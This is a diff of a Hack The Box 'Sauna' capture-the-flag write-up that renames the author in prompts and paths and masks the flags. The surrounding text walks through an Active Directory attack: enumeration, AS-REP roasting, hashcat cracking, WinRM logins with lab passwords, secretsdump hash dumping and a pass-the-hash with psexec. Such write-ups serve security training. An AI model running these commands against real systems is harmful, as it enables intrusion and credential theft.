@@ -9,6 +9,7 @@ avatar: assets/htb/sauna.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Sauna
 ---
+
 ## Overview
 
 A fairly easy Windows machine that requires a little 'outside the box' thinking in order to get the initial foothold.  After that, simple enumeration will give everything else that is needed.
@@ -54,7 +55,7 @@ In the Metasploit console the `auxiliary(gather/kerberos_enumusers)` tool enumer
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`which is a shortcut which tells nmap to scan all ports, `-sC`  is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN`  saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap <YOUR_IP>
+kac0@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 14:07 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.14s latency).
@@ -130,7 +131,7 @@ Lots of ports were open on this machine! Based on the plethora of related ports,
 ### ldapsearch enumeration
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
+kac0@kalimaa:~/htb/sauna$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
 dn: DC=EGOTISTICAL-BANK,DC=LOCAL
 objectClass: top
 objectClass: domain
@@ -221,11 +222,11 @@ Hmm... not much to go off from LDAP, though I was able to find one potential use
 
 ### Egotistical Bank website
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-egobank.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-egobank.png)
 
 On port 80 I found a website hosted for Egotistical Bank.  Most of this site consisted of template pages with lots of lorem ipsum paragraphs and very little information.  One page caught my eye, however.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-possible-users.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-possible-users.png)
 
 I found a list of potential users on the 'About Us' page under the "Meet The Team" heading.  Since these were potentially employees at Egotistical Bank I used some common username formats to turn these names into potential usernames, then proceeded to test if any of them were valid.  
 
@@ -275,7 +276,7 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 After running this scan, I only got back one hit for a valid username `hsmith`. I now had a valid username and the business format for other potential usernames . One oddity I noticed: the scan would crash Metasploit for some reason when it got to the name `fsmith` \(_I tried this multiple times with and without that name to be sure_\). I kept this username on the possibly valid list just in case.
 
 ```text
-zweilos@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/zweilos/htb/sauna/users -no-pass -dc-ip <YOUR_IP> EGOTISTICALBANK/hsmith
+kac0@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/kac0/htb/sauna/users -no-pass -dc-ip <YOUR_IP> EGOTISTICALBANK/hsmith
 
 [-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
@@ -302,10 +303,10 @@ I am not sure why `GetNPUsers.py` doesn't inform you when it finds a valid user 
 Next I fired up `hashcat` to try to crack the password hash.  The option `-m 18200` is the flag which tells `hashcat` that this is a `krb5asrep` type hash and `-a 0` makes it use the words straight from the specified wordlist without any mangling rules applied.
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force
+kac0@kalimaa:~/htb/sauna$ hashcat -m 18200 -a 0 sauna.hash ~/rockyou.txt --force
 
 Dictionary cache built:
-* Filename..: /home/zweilos/rockyou.txt
+* Filename..: /home/kac0/rockyou.txt
 * Passwords.: 14344391
 * Bytes.....: 139921506
 * Keyspace..: 14344384
@@ -319,7 +320,7 @@ Hash.Type........: Kerberos 5 AS-REP etype 23
 Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICALBANK:30279f364d1016...79dd37
 Time.Started.....: Tue Jun  2 16:14:24 2020 (52 secs)
 Time.Estimated...: Tue Jun  2 16:15:16 2020 (0 secs)
-Guess.Base.......: File (/home/zweilos/rockyou.txt)
+Guess.Base.......: File (/home/kac0/rockyou.txt)
 Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........:   203.5 kH/s (7.13ms) @ Accel:16 Loops:1 Thr:64 Vec:8
 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
@@ -340,7 +341,7 @@ Including the time spent building the dictionary file and getting everything loa
 Now that I had a username and password, I could try to log into the server using `evil-winrm`.  This tool connects to the Windows Remote Management service that is usually open on port 5985.
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u fsmith 
+kac0@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u fsmith 
 Enter Password: Thestrokes23
 
 Evil-WinRM shell v2.3
@@ -393,7 +394,7 @@ Luckily for me `fsmith` was a member of the `Remote Management Users` group and 
 
 ```text
 *Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
-1b55****70cf
+1b55************************70cf
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -466,7 +467,7 @@ For some reason there was a discrepancy between the username of the account that
 ### Moving laterally to user `svc_loanmgr`
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u svc_loanmgr
+kac0@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u svc_loanmgr
 Enter Password: Moneymakestheworldgoround!
 
 Evil-WinRM shell v2.3
@@ -517,7 +518,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 If you have credentials you can use Impacket's `secretsdump.py` to try to dump password hashes. These hashes can then be used to either crack and retrieve the passwords or in a pass-the-hash attack.  
 
 ```text
-zweilos@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@<YOUR_IP>
+kac0@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@<YOUR_IP>
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 Password:
@@ -540,7 +541,7 @@ After successfully extracting the password hash for the `Administrator` account 
 The blog at [https://en.hackndo.com/pass-the-hash/](https://en.hackndo.com/pass-the-hash/) has a nice write-up on how and why pass-the-hash attacks work.  I used the `psexec.py` tool from Impacket's examples, though there are many tools for doing this attack against Windows.  
 
 ```text
-zweilos@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@<YOUR_IP>
+kac0@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@<YOUR_IP>
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
 
 [*] Requesting shares on <YOUR_IP>.....
@@ -566,5 +567,5 @@ The final thing to do after gaining full control over this machine was to get my
 ```text
 C:\Windows\system32>cat C:\users\administrator\desktop\root.txt
 
-f3ee****881f
+f3ee************************881f
 ```
